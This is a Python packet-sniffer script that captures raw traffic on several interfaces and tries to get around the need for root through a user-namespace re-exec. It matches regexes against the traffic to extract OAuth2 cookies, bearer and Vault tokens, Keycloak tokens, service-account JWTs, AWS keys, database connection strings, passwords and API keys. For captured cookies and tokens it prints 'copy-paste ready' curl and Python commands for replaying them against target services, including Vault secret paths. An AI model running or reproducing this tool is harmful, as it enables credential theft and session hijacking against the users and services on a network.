#!/usr/bin/env python3
"""
sniff_raw.py
Logs ALL traffic in raw form — copy-paste ready for reuse.
Every token/cookie is printed exactly as it appears on the wire.

Usage:
  python3 sniff_raw.py                  # all interfaces, all traffic
  python3 sniff_raw.py -i lo            # loopback only
  python3 sniff_raw.py -i eth0 -p 10443 # specific port
  python3 sniff_raw.py --raw-only       # skip parsed summary
"""

import socket, struct, re, os, sys, argparse
from datetime import datetime

# ── Args ──────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", default="any")
parser.add_argument("-p", "--port", type=int, default=None)
parser.add_argument("-o", "--output", default=None)
parser.add_argument("--raw-only", action="store_true",
                    help="Skip parsed summary lines")
args = parser.parse_args()

INTERFACES  = (["lo", "eth0", "tunl0"]
               if args.interface == "any"
               else [args.interface])
FILTER_PORT = args.port
RAW_ONLY    = args.raw_only
OUTFILE     = args.output or \
    f"sniff_raw_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

PORT_LABELS = {
    10443: "Jupyter-TLS",   8080: "VSCode/API",
    8081:  "Jupyter",       8200: "Vault",
    8443:  "oauth2-proxy",  443:  "HTTPS",
    5432:  "PostgreSQL",    27017:"MongoDB",
    6379:  "Redis",         9090: "Prometheus",
    6443:  "k8s-API",       2379: "etcd",
    53:    "DNS",           9000: "MinIO",
    80:    "HTTP",          8888: "Jupyter-int",
    10250: "Kubelet",       8200: "Vault",
}

# Things to highlight (but always print raw)
HIGHLIGHT_PATTERNS = {
    "OAUTH2_COOKIE":    r'_oauth2_proxy=[^\s\r\n;,]+',
    "BEARER_TOKEN":     r'(?i)authorization:\s*bearer\s+[^\s\r\n]+',
    "TOKEN_HEADER":     r'(?i)authorization:\s*token\s+[^\s\r\n]+',
    "VAULT_TOKEN":      r'(?i)x-vault-token:\s*[^\s\r\n]+',
    "VAULT_TOKEN_VAL":  r'\bs\.[A-Za-z0-9]{24,}\b',
    "COOKIE_HEADER":    r'(?i)^cookie:\s*.+',
    "SET_COOKIE":       r'(?i)^set-cookie:\s*.+',
    "KEYCLOAK_TOKEN":   r'"access_token"\s*:\s*"[^"]+"',
    "REFRESH_TOKEN":    r'"refresh_token"\s*:\s*"[^"]+"',
    "SA_JWT":           r'eyJ[A-Za-z0-9\-_]+\.'
                        r'[A-Za-z0-9\-_]+\.'
                        r'[A-Za-z0-9\-_]+',
    "S3_AUTH":          r'(?i)x-amz-[^\s\r\n:]+:\s*[^\s\r\n]+',
    "S3_CRED_URL":      r'(?i)aws[_-]?(?:access[_-]?key|'
                        r'secret)[^\s\r\n=]*=[^\s\r\n&]+',
    "DB_CONN_STR":      r'(?i)(?:postgresql|mongodb|redis)'
                        r'://[^\s\r\n"\']+',
    "PASSWORD_FIELD":   r'(?i)password[=:\s"]+[^\s"&\r\n]{4,}',
    "API_KEY":          r'(?i)(?:api[_-]?key|x-api-key)'
                        r'[=:\s"]+[^\s"&\r\n]{8,}',
}

stats = {"total": 0, "tcp": 0, "udp": 0,
         "logged": 0, "highlights": 0}

# ── Writer ────────────────────────────────────────────────

def w(f, line):
    """Write line with timestamp to file and stdout"""
    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    out  = f"[{ts}] {line}"
    print(out)
    f.write(out + "\n")
    f.flush()

def w_raw(f, line):
    """Write line WITHOUT timestamp — for raw copy-paste blocks"""
    print(line)
    f.write(line + "\n")
    f.flush()

# ── Payload formatter ─────────────────────────────────────

def show_payload(f, payload):
    """
    Show payload three ways:
      1. Raw text — exactly as on the wire
      2. Highlighted lines — auth/token lines flagged
      3. Extracted values — copy-paste ready
    """
    if not payload:
        return

    # ── 1. Raw text block ─────────────────────────────────
    w_raw(f, "    ┌─── RAW PAYLOAD ──────────────────────────────")
    try:
        text = payload.decode("utf-8", errors="replace")
        for line in text.splitlines():
            w_raw(f, f"    │ {line}")
    except:
        # Binary — show hex
        hex_lines = []
        for i in range(0, min(len(payload), 512), 16):
            chunk   = payload[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in chunk)
            asc_str = ''.join(
                chr(b) if 32 <= b < 127 else '.'
                for b in chunk
            )
            hex_lines.append(
                f"    │ {i:04x}  {hex_str:<48}  {asc_str}"
            )
        for line in hex_lines:
            w_raw(f, line)
    w_raw(f, "    └─────────────────────────────────────────────")

    # ── 2 & 3. Highlights + extracted values ──────────────
    try:
        text = payload.decode("utf-8", errors="replace")
    except:
        return

    found_highlights = []
    for label, pattern in HIGHLIGHT_PATTERNS.items():
        matches = re.findall(pattern, text,
                             re.MULTILINE | re.IGNORECASE)
        for match in matches:
            found_highlights.append((label, match))
            stats["highlights"] += 1

    if found_highlights:
        w_raw(f, "")
        w_raw(f, "    ╔══ EXTRACTED VALUES "
                 "(copy-paste ready) ══════════")
        for label, value in found_highlights:
            w_raw(f, f"    ║ [{label}]")
            w_raw(f, f"    ║   {value}")
            w_raw(f, f"    ║")

            # Extra: for JWT tokens decode the payload
            if label == "SA_JWT":
                try:
                    import base64, json
                    parts = value.split('.')
                    if len(parts) >= 2:
                        pad = parts[1] + \
                              '=' * (4 - len(parts[1]) % 4)
                        decoded = json.loads(
                            base64.b64decode(pad)
                        )
                        w_raw(f, f"    ║   JWT PAYLOAD: "
                                 f"{json.dumps(decoded)[:200]}")
                        w_raw(f, f"    ║")
                except:
                    pass

            # Extra: show how to use the token
            if label == "OAUTH2_COOKIE":
                cookie_val = re.search(
                    r'_oauth2_proxy=([^\s\r\n;,]+)',
                    value
                )
                if cookie_val:
                    val = cookie_val.group(1)
                    w_raw(f, f"    ║   USE: curl -k "
                             f"-H 'Cookie: _oauth2_proxy="
                             f"{val}' "
                             f"https://TARGET:10443/PREFIX/api")
                    w_raw(f, f"    ║")
                    w_raw(f, f"    ║   OR in Python:")
                    w_raw(f, f"    ║   requests.get(url, "
                             f"headers={{'Cookie': "
                             f"'_oauth2_proxy={val[:40]}...'"
                             f"}})")
                    w_raw(f, f"    ║")

            if label == "BEARER_TOKEN":
                token_val = re.search(
                    r'(?i)authorization:\s*bearer\s+'
                    r'([^\s\r\n]+)',
                    value
                )
                if token_val:
                    val = token_val.group(1)
                    w_raw(f, f"    ║   USE: curl -k "
                             f"-H 'Authorization: Bearer "
                             f"{val}' "
                             f"https://TARGET/endpoint")
                    w_raw(f, f"    ║")

            if label == "VAULT_TOKEN":
                token_val = re.search(
                    r'(?i)x-vault-token:\s*([^\s\r\n]+)',
                    value
                )
                if token_val:
                    val = token_val.group(1)
                    w_raw(f, f"    ║   USE: curl -k "
                             f"-H 'X-Vault-Token: {val}' "
                             f"$VAULT/v1/secret/")
                    w_raw(f, f"    ║   OR:  curl -k "
                             f"-H 'X-Vault-Token: {val}' "
                             f"$VAULT/v1/auth/token/"
                             f"lookup-self")
                    w_raw(f, f"    ║")

        w_raw(f, "    ╚══════════════════════════════════════════")


# ── Packet handler ────────────────────────────────────────

def handle(raw, iface, f):
    stats["total"] += 1

    if len(raw) < 14:
        return

    eth_type = struct.unpack("!H", raw[12:14])[0]
    if eth_type == 0x0800:
        ip_data = raw[14:]
    elif eth_type not in [0x0800, 0x86DD]:
        ip_data = raw
    else:
        return

    if len(ip_data) < 20:
        return

    iph   = struct.unpack("!BBHHHBBH4s4s", ip_data[:20])
    proto = iph[6]
    src   = socket.inet_ntoa(iph[8])
    dst   = socket.inet_ntoa(iph[9])
    ihl   = (iph[0] & 0xF) * 4
    rest  = ip_data[ihl:]

    # ── TCP ───────────────────────────────────────────────
    if proto == 6:
        if len(rest) < 20:
            return
        tcph   = struct.unpack("!HHLLBBHHH", rest[:20])
        sport  = tcph[0]
        dport  = tcph[1]
        flags  = tcph[5]
        offset = (tcph[4] >> 4) * 4
        payload = rest[offset:]

        if FILTER_PORT and \
           sport != FILTER_PORT and \
           dport != FILTER_PORT:
            return

        flag_str = "".join([
            "S" if flags & 0x02 else "",
            "A" if flags & 0x10 else "",
            "F" if flags & 0x01 else "",
            "R" if flags & 0x04 else "",
            "P" if flags & 0x08 else "",
        ]) or "."

        sl = f"{sport}"
        dl = f"{dport}"
        if sport in PORT_LABELS:
            sl = f"{sport}[{PORT_LABELS[sport]}]"
        if dport in PORT_LABELS:
            dl = f"{dport}[{PORT_LABELS[dport]}]"

        w(f, f"═══ TCP {iface} "
             f"{src}:{sl} → {dst}:{dl} "
             f"flags={flag_str} "
             f"payload={len(payload)}b")

        if payload:
            show_payload(f, payload)

        stats["tcp"]    += 1
        stats["logged"] += 1

    # ── UDP ───────────────────────────────────────────────
    elif proto == 17:
        if len(rest) < 8:
            return
        sport = struct.unpack("!H", rest[:2])[0]
        dport = struct.unpack("!H", rest[2:4])[0]
        payload = rest[8:]

        if FILTER_PORT and \
           sport != FILTER_PORT and \
           dport != FILTER_PORT:
            return

        sl = f"{sport}[{PORT_LABELS[sport]}]" \
             if sport in PORT_LABELS else str(sport)
        dl = f"{dport}[{PORT_LABELS[dport]}]" \
             if dport in PORT_LABELS else str(dport)

        w(f, f"─── UDP {iface} "
             f"{src}:{sl} → {dst}:{dl} "
             f"payload={len(payload)}b")

        if payload:
            show_payload(f, payload)

        stats["udp"]    += 1
        stats["logged"] += 1

    # ── ICMP ──────────────────────────────────────────────
    elif proto == 1 and len(rest) >= 2:
        w(f, f"--- ICMP {iface} "
             f"{src} → {dst} "
             f"type={rest[0]} code={rest[1]}")
        stats["logged"] += 1


# ── Main ──────────────────────────────────────────────────

def main():
    print(f"sniff_raw.py — Full raw capture")
    print(f"  Interfaces : {INTERFACES}")
    print(f"  Port filter: {FILTER_PORT or 'ALL'}")
    print(f"  Output     : {OUTFILE}\n")

    if os.geteuid() != 0:
        print("Not root — trying unshare...")
        os.execvp("unshare", [
            "unshare", "--user", "--map-root-user",
            "--", sys.executable
        ] + sys.argv)

    # Open sockets
    socks = {}
    for iface in INTERFACES:
        try:
            s = socket.socket(
                socket.AF_PACKET,
                socket.SOCK_RAW,
                socket.htons(0x0003)
            )
            s.bind((iface, 0))
            s.settimeout(0.05)
            socks[iface] = s
            print(f"  ✓ {iface}")
        except Exception as e:
            print(f"  ✗ {iface}: {e}")

    if not socks:
        print("No interfaces available!")
        sys.exit(1)

    with open(OUTFILE, "w", buffering=1) as f:
        w(f, f"CAPTURE START {datetime.now()}")
        w(f, f"Interfaces: {list(socks.keys())}")
        w(f, f"Port: {FILTER_PORT or 'ALL'}")
        w(f, "═" * 70)

        try:
            while True:
                for iface, sock in socks.items():
                    try:
                        raw, _ = sock.recvfrom(65535)
                        handle(raw, iface, f)
                    except socket.timeout:
                        continue

                if stats["total"] % 10000 == 0 \
                   and stats["total"] > 0:
                    w(f, f"[STATS] "
                         f"total={stats['total']} "
                         f"tcp={stats['tcp']} "
                         f"udp={stats['udp']} "
                         f"highlights={stats['highlights']}")

        except KeyboardInterrupt:
            pass

        w(f, "═" * 70)
        w(f, f"CAPTURE END {datetime.now()}")
        w(f, f"packets={stats['total']} "
             f"logged={stats['logged']} "
             f"highlights={stats['highlights']}")

    print(f"\n[*] Saved to {OUTFILE}")

    # Print summary of all extracted values
    print("\n" + "=" * 60)
    print("REUSABLE VALUES EXTRACTED")
    print("=" * 60)
    print(f"Check {OUTFILE} and grep for ╔══ EXTRACTED")
    print(f"Or run: grep -A3 'EXTRACTED' {OUTFILE}")


if __name__ == "__main__":
    main()
